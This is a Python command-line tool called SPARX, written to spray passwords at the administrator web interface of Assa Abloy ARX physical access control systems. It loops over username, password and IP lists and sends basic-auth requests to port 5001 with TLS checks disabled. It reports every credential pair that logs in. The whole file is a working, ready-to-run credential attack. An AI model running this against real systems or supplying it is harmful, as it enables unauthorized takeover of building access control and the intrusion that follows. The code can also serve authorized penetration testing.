import argparse
import requests
from requests.auth import HTTPBasicAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress InsecureRequestWarning for unverified HTTPS requests to avoid cluttering the output.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ASCII Art for SPARX to visually identify the tool upon execution.
sparx_ascii_art = """
 #####  ######     #    ######  #     # 
#     # #     #   # #   #     #  #   #  
#       #     #  #   #  #     #   # #   
 #####  ######  #     # ######     #    
      # #       ####### #   #     # #   
#     # #       #     # #    #   #   #  
 #####  #       #     # #     # #     # 	
"""

# Description for SPARX, explaining the purpose of the tool.
sparx_description = """
SPARX (Spray Passwords on ARX) is a tool designed for password spraying against the Assa Abloy ARX 
access control system's administrator interface, aiding in identifying valid 
credential combinations through automated authentication attempts.
"""

# Function to test authentication with given credentials against a specific URL.
def test_auth(url, username, password, verbose):
    ip_port = url.split("//")[1].split("/")[0]  # Simplifying to show only IP:Port
    if verbose:
        print(f"[*] Attempting login for {username} with password '{password}' on {ip_port}")
    try:
        response = requests.get(url, auth=HTTPBasicAuth(username, password), verify=False)
        if response.status_code == 200:
            print(f'[!] Login successful for username {username} with password "{password}" on {ip_port}')
            return True
        elif response.status_code == 401 and verbose:
            print(f'[X] Login failed for {username} with password "{password}" on {ip_port}')
    except (requests.ConnectionError, requests.exceptions.ConnectTimeout):
        print(f'[X] ARX not found on {ip_port}')
        return 'host_unreachable'
    except Exception as e:
        print(f'[X] An error occurred while trying to connect to {ip_port}: {e}')
        return 'error'
    return False

# Function to read lines from a file and return them as a list.
def read_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f'[X] File {file_path} not found.')
        exit()

# Function to perform authentication on a single IP with a list of usernames and passwords.
def authenticate_on_ip(ip, usernames, passwords, verbose):
    url = f'https://{ip}:5001/arxac/ac1'
    for username in usernames:
        for password in passwords:
            result = test_auth(url, username, password, verbose)
            if result is True:
                return True
            elif result == 'host_unreachable':
                return 'host_unreachable'
    return False

# Main function to parse arguments and orchestrate the authentication tests.
def main():
    print(sparx_ascii_art)
    
    parser = argparse.ArgumentParser(
        description='SPARX: Password Spraying Tool for Assa Abloy ARX Systems',
        epilog=sparx_description,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output showing all attempts')
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_user.add_argument('-u', '--username', help='Single username for authentication')
    group_user.add_argument('-U', '--user_file', help='File containing list of usernames for authentication')

    group_pass = parser.add_mutually_exclusive_group(required=True)
    group_pass.add_argument('-p', '--password', help='Single password for authentication')
    group_pass.add_argument('-P', '--password_file', help='File containing list of passwords for authentication')

    group_ip = parser.add_mutually_exclusive_group(required=True)
    group_ip.add_argument('-r', '--ip', help='Single IP address for the host')
    group_ip.add_argument('-R', '--ip_file', help='File containing list of IP addresses for the hosts')

    args = parser.parse_args()

    usernames = [args.username] if args.username else read_file(args.user_file) if args.user_file else []
    passwords = [args.password] if args.password else read_file(args.password_file) if args.password_file else []
    ips = [args.ip] if args.ip else read_file(args.ip_file) if args.ip_file else []

    for ip in ips:
        result = authenticate_on_ip(ip, usernames, passwords, args.verbose)
        if result == False:
            print(f'[X] No valid credentials found for {ip}.')

if __name__ == '__main__':
    main()
